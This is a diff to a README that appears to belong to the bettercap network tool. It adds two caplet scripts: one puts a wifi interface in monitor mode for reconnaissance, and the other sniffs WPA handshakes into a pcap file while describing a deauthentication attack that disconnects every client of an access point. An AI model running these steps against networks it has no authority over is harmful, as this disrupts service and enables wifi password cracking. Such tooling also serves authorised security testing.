@@ -278,6 +278,61 @@ function onResponse(req, res) {
 }
 ```
 
+#### caplets/airmon.cap
+
+Put a wifi interface in monitor mode and listen for frames in order to detect WiF access points and clients.
+
+```
+set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}
+set ticker.commands clear; wifi.show
+
+# uncomment to disable channel hopping
+# set wifi.recon.channel 1
+
+wifi.recon on
+ticker on
+events.clear
+clear
+```
+
+#### caplets/wpa\_handshake.cap
+
+Use various modules to inject wifi frames performing a deauthentication attack, while a sniffer is waiting for WPA handshakes.
+
+```
+# swag prompt for wifi
+set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}
+
+# Sniff EAPOL frames ( WPA handshakes ) and save them to a pcap file.
+set net.sniff.verbose true
+set net.sniff.filter ether proto 0x888e
+set net.sniff.output wpa.pcap
+net.sniff on
+
+# since we need to capture the handshake, we can't hop
+# through channels but we need to stick to the one we're
+# interested in otherwise the sniffer might lose packets.
+set wifi.recon.channel 1
+
+wifi.recon on
+
+# uncomment to recon clients of a specific AP given its BSSID
+# wifi.recon DE:AD:BE:EF:DE:AD
+
+events.clear
+clear
+
+# now just deauth clients and wait ^_^
+#
+# Example:
+#
+# wifi.deauth AP-BSSID-HERE
+#
+# This will deauth every client for this specific access point,
+# you can put it as ticker.commands to have the ticker module
+# periodically deauth clients :D
+```
+
 ## License
 
 `bettercap` and `bettercap-ng` are made with ♥  by [Simone Margaritelli](https://www.evilsocket.net/) and they're released under the GPL 3 license.
